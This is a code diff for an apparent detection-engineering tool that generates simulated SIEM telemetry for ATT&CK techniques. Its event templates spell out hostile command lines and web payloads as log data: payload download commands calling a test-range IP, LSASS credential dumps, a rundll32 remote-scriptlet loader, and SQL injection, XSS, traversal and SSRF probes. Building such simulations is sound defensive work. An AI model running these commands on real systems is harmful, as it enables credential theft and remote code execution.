+    initial_technique_ids: list[str],
+    actor_profile: str,
+    analyst_goal: str,
+) -> dict[str, Any]:
+    system = (
+        "You are an expert detection engineering exercise designer. "
+        "Return only JSON. Design a defensive SIEM telemetry simulation plan, not exploit instructions. "
+        "Use ATT&CK technique IDs only. Prefer diverse telemetry: web, WAF, auth, Windows Security, Sysmon, EDR, firewall, DNS, proxy."
+    )
+    user = json.dumps(
+        {
+            "task": "Select ATT&CK techniques for a realistic attack telemetry simulation.",
+            "mode": mode,
+            "complicated_attack": complicated_attack,
+            "actor_profile": actor_profile,
+            "analyst_goal": analyst_goal,
+            "initial_technique_ids": initial_technique_ids,
+            "required_output_schema": {
+                "summary": "one sentence",
+                "technique_ids": ["T1595", "T1190"],
+                "phases": [{"name": "recon", "technique_id": "T1595", "telemetry_sources": ["nginx"]}],
+            },
+            "rules": [
+                "For complicated_attack=true, return 10-16 technique IDs.",
+                "Include high-volume recon, public web exploit attempts, user enumeration or brute force, valid account, execution, credential access, transfer, persistence, C2, and exfiltration where appropriate.",
+                "Do not include instructions to exploit real systems.",
+            ],
+        },
+        sort_keys=True,
+    )
+    try:
+        adapter = get_adapter(provider)
+        raw = await asyncio.wait_for(adapter._raw_complete(system, user), timeout=_AI_ATTACK_PLANNER_TIMEOUT_SECONDS)
+        text = raw.strip()
+        text = re.sub(r"^```(?:json)?\s*", "", text, flags=re.MULTILINE)
+        text = re.sub(r"\s*```$", "", text, flags=re.MULTILINE)
+        try:
+            data = json.loads(text)
+        except json.JSONDecodeError:
+            start = text.index("{")
+            data, _ = json.JSONDecoder().raw_decode(text, start)
+        technique_ids: list[str] = []
+        for value in data.get("technique_ids", []):
+            item = str(value).upper().strip()
+            if re.match(r"^T\d{4}(?:\.\d{3})?$", item) and item not in technique_ids:
+                technique_ids.append(item)
+        return {
+            "used": True,
+            "provider": adapter.provider,
+            "model": adapter.model,
+            "summary": str(data.get("summary") or ""),
+            "technique_ids": technique_ids,
+            "raw": raw[:4000],
+        }
+    except asyncio.TimeoutError:
+        error = f"AI planner timed out after {_AI_ATTACK_PLANNER_TIMEOUT_SECONDS:g}s"
+        logger.warning("AI attack assistant planning failed for provider %s: %s", provider, error)
+        return {
+            "used": False,
+            "provider": provider,
+            "model": "",
+            "summary": "",
+            "technique_ids": [],
+            "error": error,
+        }
+    except Exception as exc:
+        logger.warning("AI attack assistant planning failed for provider %s: %s", provider, exc)
+        return {
+            "used": False,
+            "provider": provider,
+            "model": "",
+            "summary": "",
+            "technique_ids": [],
+            "error": str(exc),
+        }
+
+
+def _assistant_event_for_ttp(
+    technique_id: str,
+    run_id: str,
+    index: int,
+    mode: str,
+    actor_profile: str,
+    analyst_goal: str,
+    template: dict[str, Any],
+    ai_provider: str,
+    complicated_attack: bool,
+) -> dict[str, Any]:
+    timestamp = datetime.now(timezone.utc).isoformat()
+    base = {
+        "timestamp": timestamp,
+        "run_id": run_id,
+        "simulation_id": "ai-assistant-attack-simulation",
+        "event_type": "ai_assistant_generated_detection_event",
+        "technique_id": technique_id,
+        "sequence": index,
+        "mode": mode,
+        "ai_provider": ai_provider,
+        "complicated_attack": complicated_attack,
+        "actor_profile": actor_profile or "challenge",
+        "analyst_goal": analyst_goal[:500],
+        "host": "WIN-ATTACK-LAB-01",
+        "user": "LAB\\alice",
+        "source": "endpoint",
+        "product": "AdversaryGraph",
+    }
+    event = {**base, **template}
+    event["raw_line"] = _assistant_vendor_raw_line(event) if complicated_attack else json.dumps(_assistant_siem_event_shape(event), sort_keys=True)
+    event["message"] = event["raw_line"]
+    return event
+
+
+def _assistant_templates_for_ttp(technique_id: str) -> list[dict[str, Any]]:
+    if technique_id.startswith("T1595"):
+        paths = ["/", "/robots.txt", "/.git/config", "/.env", "/admin", "/wp-login.php", "/phpmyadmin", "/server-status", "/actuator/env", "/api/v1/users", "/backup.zip", "/owa/auth/logon.aspx"]
+        return [
+            {
+                "provider": "nginx",
+                "event_id": "AG-WEB-1595",
+                "event_name": "ActiveScanning",
+                "severity": "medium" if index < 6 else "high",
+                "src_ip": "198.51.100.77",
+                "url": path,
+                "http_method": "GET" if path != "/" else "HEAD",
+                "status": 200 if path in {"/", "/robots.txt"} else 404,
+                "user_agent": ["curl/8.1.2", "python-requests/2.31", "sqlmap/1.7", "Nmap Scripting Engine"][index % 4],
+                "rule_name": "Reconnaissance path enumeration and tool fingerprinting",
+                "detection_focus": ["path diversity", "tool user-agent", "404 burst", "sensitive path"],
+                "flow_stage": "reconnaissance",
+                "request_index": index + 1,
+            }
+            for index, path in enumerate(paths)
+        ]
+    if technique_id.startswith("T1190"):
+        payloads = [
+            ("GET", "/search?q=%27%20OR%20%271%27%3D%271--", "SQL injection boolean probe", "sqli"),
+            ("GET", "/search?q=%27%20UNION%20SELECT%20user,password%20FROM%20users--", "SQL injection UNION probe", "sqli"),
+            ("GET", "/product?id=1%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--", "SQL injection time delay probe", "sqli"),
+            ("GET", "/login?next=%3Cscript%3Ealert(1)%3C/script%3E", "Reflected XSS script probe", "xss"),
+            ("GET", "/profile?name=%3Cimg%20src=x%20onerror=alert(1)%3E", "Reflected XSS event handler probe", "xss"),
+            ("POST", "/api/search", "JSON SQLi body probe", "sqli"),
+            ("GET", "/download?file=..%2F..%2F..%2Fetc%2Fpasswd", "Path traversal probe", "path_traversal"),
+            ("GET", "/fetch?url=http://169.254.169.254/latest/meta-data/", "SSRF metadata probe", "ssrf"),
+            ("POST", "/upload/shell.php", "Suspicious web extension upload", "webshell"),
+            ("POST", "/admin/exec", "Command injection shaped body", "command_injection"),
+            ("GET", "/search?q=%2527%2520OR%25201%253D1--", "Double encoded SQLi retry", "sqli"),
+            ("GET", "/comment?body=javascript:alert(document.domain)", "JavaScript URI XSS probe", "xss"),
+        ]
+        events = []
+        for index, (method, url, name, canary) in enumerate(payloads):
+            events.append(
+                {
+                    "provider": "waf",
+                    "event_id": "AG-WAF-1190",
+                    "event_name": "ExploitPublicFacingApplication",
+                    "severity": "high",
+                    "src_ip": "203.0.113.45",
+                    "url": url,
+                    "http_method": method,
+                    "status": 403 if index != 5 else 500,
+                    "request_body_sha256": hashlib.sha256(f"{method}:{url}:{name}".encode("utf-8")).hexdigest(),
+                    "rule_name": name,
+                    "canary_classification": canary,
+                    "detection_focus": ["payload family", "blocked request", "response anomaly", "same source correlation"],
+                    "flow_stage": "public_app_exploitation",
+                    "request_index": index + 1,
+                }
+            )
+        return events
+    if technique_id.startswith("T1110") or technique_id == "T1110":
+        users = ["admin", "administrator", "svc-backup", "svc-deploy", "jsmith", "mcohen", "orlevy", "backup", "root", "helpdesk"]
+        events = []
+        for round_id, password_name in enumerate(["Summer2026!", "Password1!", "Welcome2026!"]):
+            for user_index, target_user in enumerate(users):
+                events.append(
+                    {
+                        "provider": "windows_security",
+                        "event_id": "4625",
+                        "event_name": "FailedLogon",
+                        "severity": "high" if round_id > 0 else "medium",
+                        "logon_type": "3",
+                        "target_user": target_user,
+                        "src_ip": "10.20.30.44",
+                        "failure_reason": "Bad password",
+                        "sub_status": "0xC000006A",
+                        "password_pattern": f"candidate-{round_id + 1}",
+                        "rule_name": "Password spraying or brute-force failure flow",
+                        "detection_focus": ["4625 burst", "many users", "shared password candidate", "single source"],
+                        "flow_stage": "credential_attack",
+                        "request_index": round_id * len(users) + user_index + 1,
+                    }
+                )
+        events.append(
+            {
+                "provider": "windows_security",
+                "event_id": "4624",
+                "event_name": "SuccessfulLogon",
+                "severity": "critical",
+                "logon_type": "3",
+                "target_user": "svc-backup",
+                "src_ip": "10.20.30.44",
+                "rule_name": "Successful logon after password spray failures",
+                "detection_focus": ["4624 after 4625 burst", "service account", "same source IP"],
+                "flow_stage": "credential_attack_success",
+                "request_index": len(events) + 1,
+            }
+        )
+        return events
+    if technique_id.startswith("T1589"):
+        names = ["admin", "administrator", "svc-backup", "billing", "finance", "hr", "itadmin", "orlevy", "david", "miriam", "backup", "support"]
+        return [
+            {
+                "provider": "application_auth",
+                "event_id": "AG-AUTH-USER-ENUM",
+                "event_name": "UserEnumeration",
+                "severity": "medium",
+                "src_ip": "198.51.100.81",
+                "url": f"/login/user-check?username={name}",
+                "http_method": "GET",
+                "status": 200 if name in {"admin", "svc-backup", "support"} else 404,
+                "target_user": name,
+                "user_exists": name in {"admin", "svc-backup", "support"},
+                "rule_name": "Username enumeration response differential",
+                "detection_focus": ["many usernames", "response differential", "single source"],
+                "flow_stage": "user_enumeration",
+                "request_index": index + 1,
+            }
+            for index, name in enumerate(names)
+        ]
+    template = _assistant_template(technique_id)
+    expanded = [template]
+    if technique_id.startswith("T1059"):
+        expanded.extend(
+            [
+                {**template, "command_line": "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgA", "rule_name": "Encoded PowerShell hidden execution"},
+                {**template, "command_line": "cmd.exe /c whoami && hostname && ipconfig /all", "event_id": "1", "event_name": "ProcessCreate", "rule_name": "Command shell discovery chain"},
+                {**template, "command_line": "powershell.exe -NoP -ExecutionPolicy Bypass Invoke-WebRequest http://203.0.113.10/a.ps1 -OutFile C:\\\\ProgramData\\\\a.ps1", "rule_name": "PowerShell download cradle"},
+            ]
+        )
+    elif technique_id.startswith("T1003"):
+        expanded.extend(
+            [
+                {**template, "image": "C:\\\\Windows\\\\System32\\\\procdump64.exe", "target_image": "C:\\\\Windows\\\\System32\\\\lsass.exe", "command_line": "procdump64.exe -ma lsass.exe C:\\\\ProgramData\\\\lsass.dmp", "rule_name": "ProcDump LSASS dump"},
+                {**template, "image": "C:\\\\Windows\\\\System32\\\\rundll32.exe", "command_line": "rundll32.exe C:\\\\Windows\\\\System32\\\\comsvcs.dll, MiniDump 632 C:\\\\ProgramData\\\\lsass.dmp full", "rule_name": "Comsvcs MiniDump LSASS dump"},
+            ]
+        )
+    elif technique_id.startswith("T1105"):
+        expanded.extend(
+            [
+                {**template, "image": "C:\\\\Windows\\\\System32\\\\bitsadmin.exe", "command_line": "bitsadmin /transfer job http://203.0.113.10/stage2.dll C:\\\\ProgramData\\\\stage2.dll", "rule_name": "BITSAdmin ingress transfer"},
+                {**template, "image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe", "command_line": "powershell.exe iwr http://203.0.113.10/beacon.exe -OutFile C:\\\\Users\\\\Public\\\\beacon.exe", "rule_name": "PowerShell ingress transfer"},
+            ]
+        )
+    return [{**item, "flow_stage": item.get("flow_stage") or _assistant_flow_stage_for_ttp(technique_id), "request_index": index + 1} for index, item in enumerate(expanded)]
+
+
+def _assistant_flow_stage_for_ttp(technique_id: str) -> str:
+    if technique_id.startswith("T1078"):
+        return "valid_account_foothold"
+    if technique_id.startswith("T1059"):
+        return "execution_and_discovery"
+    if technique_id.startswith("T1105"):
+        return "ingress_tool_transfer"
+    if technique_id.startswith("T1218"):
+        return "defense_evasion_execution"
+    if technique_id.startswith("T1003"):
+        return "credential_access"
+    if technique_id.startswith("T1547"):
+        return "persistence_run_key"
+    if technique_id.startswith("T1053"):
+        return "persistence_scheduled_task"
+    if technique_id.startswith("T1041"):
+        return "exfiltration_channel"
+    if technique_id.startswith("T1567"):
+        return "exfiltration_to_cloud_service"
+    if technique_id.startswith("T1082"):
+        return "system_discovery"
+    return "post_compromise"
+
+
+def _assistant_complicated_templates_for_ttp(technique_id: str) -> list[dict[str, Any]]:
+    if technique_id.startswith("T1046"):
+        return [
+            {
+                "provider": "firewall",
+                "source_format": "pan_traffic",
+                "event_id": "TRAFFIC",
+                "event_name": "PortScan",
+                "severity": "medium",
+                "src_ip": "10.20.30.44",
+                "dest_ip": f"10.20.40.{index + 10}",
+                "dest_port": [22, 80, 135, 139, 443, 445, 3389, 5985, 8080, 8443, 9200, 1433][index - 1],
+                "protocol": "tcp",
+                "action": "allow" if index % 4 else "deny",
+                "rule_name": "Internal port sweep after foothold",
+                "detection_focus": ["many destination ports", "internal sweep", "single source"],
+                "flow_stage": "internal_network_discovery",
+                "request_index": index,
+                "original_vendor_pattern": True,
+            }
+            for index in range(1, 13)
+        ]
+    if technique_id.startswith("T1071.004"):
+        domains = ["update-check.microsoft-security.invalid", "cdn-cache-cloudfront.invalid", "storage-api-backup.invalid", "graph-login-sync.invalid"]
+        return [
+            {
+                "provider": "dns",
+                "source_format": "bind_dns",
+                "event_id": "QUERY",
+                "event_name": "DnsQuery",
+                "severity": "medium",
+                "src_ip": "10.20.30.44",
+                "query_name": domain,
+                "query_type": "A",
+                "response_code": "NOERROR" if index < 4 else "NXDOMAIN",
+                "rule_name": "Suspicious beacon-like DNS lookups",
+                "detection_focus": ["new domain", "rare domain", "post-compromise host"],
+                "flow_stage": "c2_dns_resolution",
+                "request_index": index,
+                "original_vendor_pattern": True,
+            }
+            for index, domain in enumerate(domains, start=1)
+        ]
+    if technique_id.startswith("T1071.001"):
+        return [
+            {
+                "provider": "edr",
+                "source_format": "crowdstrike_json",
+                "event_id": "NetworkConnectIP4",
+                "event_name": "OutboundNetworkConnection",
+                "severity": "high",
+                "image": "C:\\\\Users\\\\Public\\\\beacon.exe",
+                "src_ip": "10.20.30.44",
+                "destination_ip": dest,
+                "destination_port": 443,
+                "protocol": "tcp",
+                "rule_name": "Beacon process outbound connection",
+                "detection_focus": ["unknown binary", "external TLS", "post-download execution"],
+                "flow_stage": "command_and_control",
+                "request_index": index,
+                "original_vendor_pattern": True,
+            }
+            for index, dest in enumerate(["203.0.113.10", "203.0.113.11", "198.51.100.200"], start=1)
+        ]
+    base = _assistant_templates_for_ttp(technique_id)
+    complicated: list[dict[str, Any]] = []
+    for event in base:
+        source_hint = str(event.get("provider") or "")
+        if source_hint in {"nginx", "waf"}:
+            source_format = "nginx_access" if source_hint == "nginx" else "modsecurity_waf"
+        elif source_hint == "windows_security":
+            source_format = "windows_event_xml"
+        elif source_hint == "sysmon":
+            source_format = "sysmon_xml"
+        elif source_hint == "proxy":
+            source_format = "bluecoat_proxy"
+        else:
+            source_format = "edr_json"
+        complicated.append({**event, "source_format": source_format, "original_vendor_pattern": True})
+    return complicated
+
+
+def _assistant_add_cross_source_complicated_events(
+    events: list[dict[str, Any]],
+    run_id: str,
+    mode: str,
+    actor_profile: str,
+    analyst_goal: str,
+    ai_provider: str,
+) -> list[dict[str, Any]]:
+    extra_templates: list[tuple[str, dict[str, Any]]] = []
+    for index in range(1, 13):
+        extra_templates.append(
+            (
+                "T1046",
+                {
+                    "provider": "firewall",
+                    "source_format": "pan_traffic",
+                    "event_id": "TRAFFIC",
+                    "event_name": "PortScan",
+                    "severity": "medium",
+                    "src_ip": "10.20.30.44",
+                    "dest_ip": f"10.20.40.{index + 10}",
+                    "dest_port": [22, 80, 135, 139, 443, 445, 3389, 5985, 8080, 8443, 9200, 1433][index - 1],
+                    "protocol": "tcp",
+                    "action": "allow" if index % 4 else "deny",
+                    "rule_name": "Internal port sweep after foothold",
+                    "detection_focus": ["many destination ports", "internal sweep", "single source"],
+                    "flow_stage": "internal_network_discovery",
+                    "request_index": index,
+                    "original_vendor_pattern": True,
+                },
+            )
+        )
+    for index, domain in enumerate(["update-check.microsoft-security.invalid", "cdn-cache-cloudfront.invalid", "storage-api-backup.invalid", "graph-login-sync.invalid"], start=1):
+        extra_templates.append(
+            (
+                "T1071.004",
+                {
+                    "provider": "dns",
+                    "source_format": "bind_dns",
+                    "event_id": "QUERY",
+                    "event_name": "DnsQuery",
+                    "severity": "medium",
+                    "src_ip": "10.20.30.44",
+                    "query_name": domain,
+                    "query_type": "A",
+                    "response_code": "NOERROR" if index < 4 else "NXDOMAIN",
+                    "rule_name": "Suspicious beacon-like DNS lookups",
+                    "detection_focus": ["new domain", "rare domain", "post-compromise host"],
+                    "flow_stage": "c2_dns_resolution",
+                    "request_index": index,
+                    "original_vendor_pattern": True,
+                },
+            )
+        )
+    for index, dest in enumerate(["203.0.113.10", "203.0.113.11", "198.51.100.200"], start=1):
+        extra_templates.append(
+            (
+                "T1071.001",
+                {
+                    "provider": "edr",
+                    "source_format": "crowdstrike_json",
+                    "event_id": "NetworkConnectIP4",
+                    "event_name": "OutboundNetworkConnection",
+                    "severity": "high",
+                    "image": "C:\\\\Users\\\\Public\\\\beacon.exe",
+                    "src_ip": "10.20.30.44",
+                    "destination_ip": dest,
+                    "destination_port": 443,
+                    "protocol": "tcp",
+                    "rule_name": "Beacon process outbound connection",
+                    "detection_focus": ["unknown binary", "external TLS", "post-download execution"],
+                    "flow_stage": "command_and_control",
+                    "request_index": index,
+                    "original_vendor_pattern": True,
+                },
+            )
+        )
+    output = list(events)
+    for technique_id, template in extra_templates:
+        output.append(_assistant_event_for_ttp(technique_id, run_id, len(output) + 1, mode, actor_profile, analyst_goal, template, ai_provider, True))
+    return output
+
+
+def _assistant_vendor_raw_line(event: dict[str, Any]) -> str:
+    source_format = str(event.get("source_format") or "edr_json")
+    timestamp = str(event.get("timestamp") or datetime.now(timezone.utc).isoformat())
+    if source_format == "windows_event_xml":
+        return (
+            f'<Event><System><Provider Name="{event.get("provider")}"/><EventID>{event.get("event_id")}</EventID>'
+            f'<TimeCreated SystemTime="{timestamp}"/><Computer>{event.get("host")}</Computer></System>'
+            f'<EventData><Data Name="TargetUserName">{event.get("target_user", "-")}</Data>'
+            f'<Data Name="IpAddress">{event.get("src_ip", "-")}</Data><Data Name="LogonType">{event.get("logon_type", "-")}</Data>'
+            f'<Data Name="FailureReason">{event.get("failure_reason", "-")}</Data>'
+            f'<Data Name="RunId">{event.get("run_id")}</Data><Data Name="Technique">{event.get("technique_id")}</Data></EventData></Event>'
+        )
+    if source_format == "sysmon_xml":
+        return (
+            f'<Event><System><Provider Name="Microsoft-Windows-Sysmon"/><EventID>{event.get("event_id")}</EventID>'
+            f'<TimeCreated SystemTime="{timestamp}"/><Computer>{event.get("host")}</Computer></System>'
+            f'<EventData><Data Name="Image">{event.get("image", "-")}</Data><Data Name="CommandLine">{event.get("command_line", "-")}</Data>'
+            f'<Data Name="ParentImage">{event.get("parent_image", "-")}</Data><Data Name="TargetImage">{event.get("target_image", "-")}</Data>'
+            f'<Data Name="RuleName">{event.get("rule_name")}</Data><Data Name="RunId">{event.get("run_id")}</Data></EventData></Event>'
+        )
+    if source_format == "nginx_access":
+        return (
+            f'{event.get("src_ip", "198.51.100.77")} - - [{_apache_log_time(timestamp)}] '
+            f'"{event.get("http_method", "GET")} {event.get("url", "/")} HTTP/1.1" {int(event.get("status") or 0)} 512 "-" '
+            f'"{event.get("user_agent", "Mozilla/5.0")}" rt=0.003 run_id="{event.get("run_id")}" technique="{event.get("technique_id")}"'
+        )
+    if source_format == "modsecurity_waf":
+        return (
+            f'{timestamp} ModSecurity: Warning. Matched "{event.get("canary_classification", "attack")}" at REQUEST_URI. '
+            f'[id "9{hashlib.sha1(str(event.get("rule_name")).encode()).hexdigest()[:6]}"] [severity "{event.get("severity", "high")}"] '
+            f'[msg "{event.get("rule_name")}"] [client "{event.get("src_ip", "-")}"] [uri "{event.get("url", "-")}"] '
+            f'[unique_id "{event.get("run_id")}"] [tag "{event.get("technique_id")}"]'
+        )
+    if source_format == "pan_traffic":
+        return (
+            f'1,{timestamp},001801000001,TRAFFIC,end,2561,{timestamp},{event.get("src_ip")},{event.get("dest_ip")},0.0.0.0,0.0.0.0,'
+            f'allow-any,,,ssl,vsys1,trust,untrust,ethernet1/1,ethernet1/2,log-forward,{timestamp},1,{event.get("dest_port")},'
+            f'{event.get("dest_port")},0,0,0x0,{event.get("protocol")},{event.get("action")},512,256,1,{event.get("rule_name")},'
+            f'run_id={event.get("run_id")},technique={event.get("technique_id")}'
+        )
+    if source_format == "bind_dns":
+        return (
+            f'{timestamp} client @{event.get("src_ip")}#53532 ({event.get("query_name")}): query: {event.get("query_name")} '
+            f'IN {event.get("query_type", "A")} +E(0)K ({event.get("response_code")}) run_id={event.get("run_id")} technique={event.get("technique_id")}'
+        )
+    if source_format == "bluecoat_proxy":
+        return (
+            f'{timestamp} {event.get("src_ip", "10.20.30.55")} {event.get("dest_host", "example.invalid")} '
+            f'{event.get("http_method", "POST")} {event.get("url", "/")} 200 TCP_MISS bytes_out={event.get("bytes_out", 0)} '
+            f'user={event.get("user", "-")} run_id={event.get("run_id")} technique={event.get("technique_id")}'
+        )
+    payload = {
+        "metadata": {"vendor": "CrowdStrike", "product": "Falcon", "event_simpleName": event.get("event_id"), "run_id": event.get("run_id")},
+        "event": {key: value for key, value in event.items() if key not in {"raw_line", "message"}},
+    }
+    return json.dumps(payload, sort_keys=True)
+
+
+def _assistant_template(technique_id: str) -> dict[str, Any]:
+    if technique_id.startswith("T1190"):
+        return {
+            "provider": "waf",
+            "event_id": "AG-WAF-1190",
+            "event_name": "ExploitPublicFacingApplication",
+            "severity": "high",
+            "src_ip": "203.0.113.45",
+            "url": "/search?q=%27%20UNION%20SELECT%20password%20FROM%20users--",
+            "http_method": "GET",
+            "status": 403,
+            "rule_name": "SQL injection against public web endpoint",
+            "detection_focus": ["sqli payload", "blocked request", "public endpoint"],
+        }
+    if technique_id.startswith("T1595"):
+        return {
+            "provider": "nginx",
+            "event_id": "AG-WEB-1595",
+            "event_name": "ActiveScanning",
+            "severity": "medium",
+            "src_ip": "198.51.100.77",
+            "url": "/.git/config",
+            "http_method": "GET",
+            "status": 404,
+            "user_agent": "sqlmap/1.7",
+            "rule_name": "Tool fingerprint and sensitive path discovery",
+            "detection_focus": ["tool user-agent", "sensitive path", "404 burst"],
+        }
+    if technique_id.startswith("T1110"):
+        return {
+            "provider": "windows_security",
+            "event_id": "4625",
+            "event_name": "FailedLogon",
+            "severity": "high",
+            "logon_type": "3",
+            "target_user": "svc-backup",
+            "src_ip": "10.20.30.44",
+            "failure_reason": "Bad password",
+            "rule_name": "Password spraying or brute-force failures",
+            "detection_focus": ["4625 burst", "single password pattern", "many users or repeated service account"],
+        }
+    if technique_id.startswith("T1078"):
+        return {
+            "provider": "windows_security",
+            "event_id": "4624",
+            "event_name": "SuccessfulLogon",
+            "severity": "medium",
+            "logon_type": "10",
+            "target_user": "admin.ops",
+            "src_ip": "10.20.30.44",
+            "rule_name": "Valid account remote interactive logon from unusual source",
+            "detection_focus": ["first seen source", "privileged account", "post-failure success"],
+        }
+    if technique_id.startswith("T1003"):
+        return {
+            "provider": "sysmon",
+            "event_id": "10",
+            "event_name": "ProcessAccess",
+            "severity": "critical",
+            "image": "C:\\\\Windows\\\\System32\\\\rundll32.exe",
+            "target_image": "C:\\\\Windows\\\\System32\\\\lsass.exe",
+            "granted_access": "0x1010",
+            "call_trace": "dbghelp.dll;comsvcs.dll",
+            "rule_name": "Credential dumping access to LSASS",
+            "detection_focus": ["lsass target", "suspicious access mask", "dump-capable module"],
+        }
+    if technique_id.startswith("T1105"):
+        return {
+            "provider": "sysmon",
+            "event_id": "1",
+            "event_name": "ProcessCreate",
+            "severity": "high",
+            "image": "C:\\\\Windows\\\\System32\\\\certutil.exe",
+            "parent_image": "C:\\\\Windows\\\\System32\\\\cmd.exe",
+            "command_line": "certutil.exe -urlcache -split -f http://203.0.113.10/payload.dat C:\\\\ProgramData\\\\payload.dat",
+            "rule_name": "Ingress tool transfer with certutil",
+            "detection_focus": ["certutil", "urlcache", "external URL", "ProgramData destination"],
+        }
+    if technique_id.startswith("T1547"):
+        return {
+            "provider": "sysmon",
+            "event_id": "13",
+            "event_name": "RegistryValueSet",
+            "severity": "high",
+            "target_object": "HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\Updater",
+            "details": "C:\\\\Users\\\\alice\\\\AppData\\\\Roaming\\\\updater.exe",
+            "rule_name": "Run key persistence",
+            "detection_focus": ["Run key", "user profile executable", "new autorun value"],
+        }
+    if technique_id.startswith("T1053"):
+        return {
+            "provider": "windows_security",
+            "event_id": "4698",
+            "event_name": "ScheduledTaskCreated",
+            "severity": "high",
+            "task_name": "\\\\Microsoft\\\\Windows\\\\UpdateHealth\\\\CacheTask",
+            "task_content": "powershell.exe -ExecutionPolicy Bypass -File C:\\\\ProgramData\\\\cache.ps1",
+            "rule_name": "Suspicious scheduled task persistence",
+            "detection_focus": ["4698", "PowerShell action", "masqueraded task path"],
+        }
+    if technique_id.startswith("T1218"):
+        return {
+            "provider": "sysmon",
+            "event_id": "1",
+            "event_name": "ProcessCreate",
+            "severity": "high",
+            "image": "C:\\\\Windows\\\\System32\\\\rundll32.exe",
+            "parent_image": "C:\\\\Windows\\\\System32\\\\cmd.exe",
+            "command_line": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";document.write();GetObject(\"script:http://203.0.113.10/a.sct\")",
+            "rule_name": "Signed binary proxy execution",
+            "detection_focus": ["rundll32", "mshtml RunHTMLApplication", "remote scriptlet"],
+        }
+    if technique_id.startswith("T1041") or technique_id.startswith("T1567"):
+        return {
+            "provider": "proxy",
+            "event_id": "AG-PROXY-EXFIL",
+            "event_name": "ExfiltrationOverWebService",
+            "severity": "high",
+            "src_ip": "10.20.30.55",
+            "dest_host": "files.example-upload.invalid",
+            "bytes_out": 52428800,
+            "http_method": "POST",
+            "url": "/api/upload",
+            "rule_name": "Large outbound upload after endpoint compromise",
+            "detection_focus": ["large bytes_out", "new destination", "POST upload"],
+        }
+    return {
+        "provider": "sysmon",
+        "event_id": "1",
+        "event_name": "ProcessCreate",
+        "severity": "medium",
+        "image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+        "parent_image": "C:\\\\Windows\\\\explorer.exe",
+        "command_line": "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgA",
+        "rule_name": f"Suspicious process behavior mapped to {technique_id}",
+        "detection_focus": ["process command line", "parent process", "ATT&CK mapping"],
+    }
+
+
+def _assistant_siem_event_shape(event: dict[str, Any]) -> dict[str, Any]:
+    return {
+        "Event": {
+            "System": {
+                "Provider": {"Name": event.get("provider")},
+                "EventID": event.get("event_id"),
+                "Computer": event.get("host"),
+                "TimeCreated": {"SystemTime": event.get("timestamp")},
+            },
+            "EventData": {key: value for key, value in event.items() if key not in {"raw_line", "message"}},
+        }
+    }
+
+
+def _assistant_attack_plan(
+    events: list[dict[str, Any]],
+    mode: str,
+    actor_profile: str,
+    analyst_goal: str,
+    ai_provider: str,
+    complicated_attack: bool,
+) -> dict[str, Any]:
+    grouped: dict[tuple[str, str], dict[str, Any]] = {}
+    for event in events:
+        key = (str(event.get("technique_id")), str(event.get("flow_stage") or "activity"))
+        if key not in grouped:
+            grouped[key] = {
+                "step": len(grouped) + 1,
+                "technique_id": event["technique_id"],
+                "event_source": event["provider"],
+                "event_id": event["event_id"],
+                "detection_goal": event["rule_name"],
+                "focus": event["detection_focus"],
+                "flow_stage": event.get("flow_stage") or "activity",
+                "source_format": event.get("source_format") or "normalized_json",
+                "event_count": 0,
+            }
+        grouped[key]["event_count"] += 1
+    scenario_summary = (
+        f"AI assistant generated a coherent web-to-endpoint intrusion kill chain with {len(events)} correlated telemetry events "
+        f"across {len(grouped)} ordered phases for {actor_profile or mode}."
+        if complicated_attack
+        else f"AI assistant generated {len(events)} correlated telemetry events across {len(grouped)} attack phases for {actor_profile or mode}."
+    )
+    return {
+        "summary": scenario_summary,
+        "mode": mode,
+        "ai_provider": ai_provider,
+        "complicated_attack": complicated_attack,
+        "payload_style": "original vendor/source raw lines" if complicated_attack else "structured JSON events",
+        "actor_profile": actor_profile,
+        "analyst_goal": analyst_goal,
+        "kill_chain": list(grouped.values()),
+        "validation_note": "Generated telemetry is for SIEM rule validation and detection engineering drills. It is not proof of real compromise.",
+    }
+
+
 def _siem_payload_body(logs: dict[str, Any], payload_format: str) -> bytes:
     if payload_format == "json_lines":
         lines = [_siem_event_payload(event, logs) for event in logs["events"]]
@@ -2351,8 +3607,8 @@ def _post_siem_payload(
     _ensure_strict_loopback_bridge(destination, connection_mode)
     try:
         return _post_siem_payload_once(destination, body, headers, started, original_destination, connection_mode), ""
-    except URLError as exc:
-        error = str(exc.reason)
+    except (URLError, OSError) as exc:
+        error = str(getattr(exc, "reason", exc))
         fallback_destination = _http_fallback_destination(destination)
         if allow_http_fallback and fallback_destination and _is_tls_protocol_error(error):
             fallback_result = _post_siem_payload_once(fallback_destination, body, headers, started, original_destination, connection_mode)
@@ -2362,7 +3618,7 @@ def _post_siem_payload(
             "status": 0,
             "destination_url": _redact_siem_destination(destination),
             "connection_mode": connection_mode,
-            "error": _siem_connection_error(str(exc.reason), original_destination, destination, connection_mode),
+            "error": _siem_connection_error(error, original_destination, destination, connection_mode),
             "response_preview": "",
             "response_headers": {},
         }, ""
@@ -2675,6 +3931,22 @@ def _validate_siem_destination(destination_url: str, connection_mode: str = "aut
         if str(ip) == "169.254.169.254":
             raise ValueError("Metadata service destinations are blocked")
 
+    return parse.urlunparse(parsed)
+
+
+def normalize_siem_destination_for_storage(destination_url: str) -> str:
+    destination = destination_url.strip()
+    if not destination:
+        raise ValueError("SIEM destination URL is required")
+    if not re.match(r"^[A-Za-z][A-Za-z0-9+.-]*://", destination):
+        destination = f"http://{destination}"
+    parsed = parse.urlparse(destination)
+    if parsed.scheme not in {"http", "https"}:
+        raise ValueError("SIEM destination must use http or https")
+    if not parsed.hostname:
+        raise ValueError("SIEM destination host is required")
+    if parsed.username or parsed.password:
+        raise ValueError("Credentials in SIEM URL are not allowed; use the SIEM authentication fields instead")
     return parse.urlunparse(parsed)
 
 
